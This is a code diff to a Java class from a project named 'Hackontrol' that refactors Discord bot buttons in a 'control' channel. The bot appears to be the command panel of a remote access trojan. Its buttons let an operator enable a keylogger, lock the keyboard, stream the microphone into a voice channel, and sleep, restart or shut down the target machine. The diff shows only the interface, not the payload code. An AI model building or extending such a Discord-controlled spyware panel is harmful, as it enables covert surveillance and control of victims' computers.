@@ -23,25 +23,27 @@ import com.khopan.hackontrol.utils.HackontrolMessage;
 import net.dv8tion.jda.api.audio.AudioSendHandler;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
+import net.dv8tion.jda.api.interactions.components.ActionRow;
+import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.managers.AudioManager;
 
 public class ControlChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "control";
 
-	private static final String BUTTON_SLEEP = "buttonSleep";
-	private static final String BUTTON_HIBERNATE = "buttonHibernate";
-	private static final String BUTTON_RESTART = "buttonRestart";
-	private static final String BUTTON_SHUTDOWN = "buttonShutdown";
+	private static final Button BUTTON_SLEEP = ButtonManager.staticButton(ButtonStyle.SECONDARY, "Sleep", "sleep");
+	private static final Button BUTTON_HIBERNATE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Hibernate", "hibernate");
+	private static final Button BUTTON_RESTART = ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", "restart");
+	private static final Button BUTTON_SHUTDOWN = ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", "shutdown");
 
-	private static final String BUTTON_CONNECT = "controlConnect";
-	private static final String BUTTON_DISCONNECT = "controlDisconnect";
+	private static final Button BUTTON_CONNECT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", "connect");
+	private static final Button BUTTON_DISCONNECT = ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", "disconnect");
 
-	private static final String BUTTON_ENABLE_KEYLOGGER = "keyloggerEnable";
-	private static final String BUTTON_DISABLE_KEYLOGGER = "keyloggerDisable";
+	private static final Button BUTTON_ENABLE_KEYLOGGER = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Enable KeyLogger", "enableKeyLogger");
+	private static final Button BUTTON_DISABLE_KEYLOGGER = ButtonManager.staticButton(ButtonStyle.DANGER, "Disable KeyLogger", "disableKeyLogger");
 
-	private static final String BUTTON_LOCK_KEYBOARD = "keyboardLock";
-	private static final String BUTTON_UNLOCK_KEYBOARD = "keyboardUnlock";
+	private static final Button BUTTON_LOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Lock Keyboard", "lockKeyboard");
+	private static final Button BUTTON_UNLOCK_KEYBOARD = ButtonManager.staticButton(ButtonStyle.DANGER, "Unlock Keyboard", "unlockKeyboard");
 
 	private AudioManager audioManager;
 	private SendHandler handler;
@@ -58,25 +60,10 @@ public class ControlChannel extends HackontrolChannel {
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessage("**Power Control**").addActionRow(
-				ButtonManager.staticButton(ButtonStyle.SECONDARY, "Sleep", ControlChannel.BUTTON_SLEEP),
-				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Hibernate", ControlChannel.BUTTON_HIBERNATE),
-				ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", ControlChannel.BUTTON_RESTART),
-				ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", ControlChannel.BUTTON_SHUTDOWN)
-				).queue();
-
-		this.channel.sendMessage("**Microphone Control**").addActionRow(
-				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", ControlChannel.BUTTON_CONNECT),
-				ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", ControlChannel.BUTTON_DISCONNECT)
-				).queue();
-
-		this.channel.sendMessage("**KeyLogger Control**").addActionRow(
-				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Enable KeyLogger", ControlChannel.BUTTON_ENABLE_KEYLOGGER),
-				ButtonManager.staticButton(ButtonStyle.DANGER, "Disable KeyLogger", ControlChannel.BUTTON_DISABLE_KEYLOGGER)
-				).addActionRow(
-						ButtonManager.staticButton(ButtonStyle.SUCCESS, "Lock Keyboard", ControlChannel.BUTTON_LOCK_KEYBOARD),
-						ButtonManager.staticButton(ButtonStyle.DANGER, "Unlock Keyboard", ControlChannel.BUTTON_UNLOCK_KEYBOARD)
-						).queue();
+		this.channel.sendMessage("**Power Control**").addActionRow(ControlChannel.BUTTON_SLEEP, ControlChannel.BUTTON_HIBERNATE, ControlChannel.BUTTON_RESTART, ControlChannel.BUTTON_SHUTDOWN).queue();
+		this.channel.sendMessage("**Microphone Control**").addActionRow(ControlChannel.BUTTON_CONNECT, ControlChannel.BUTTON_DISCONNECT).queue();
+		this.channel.sendMessage("**KeyLogger Control**").addActionRow(ControlChannel.BUTTON_ENABLE_KEYLOGGER, ControlChannel.BUTTON_DISABLE_KEYLOGGER).queue();
+		this.channel.sendMessageComponents(ActionRow.of(ControlChannel.BUTTON_LOCK_KEYBOARD, ControlChannel.BUTTON_UNLOCK_KEYBOARD)).queue();
 	}
 
 	@Override
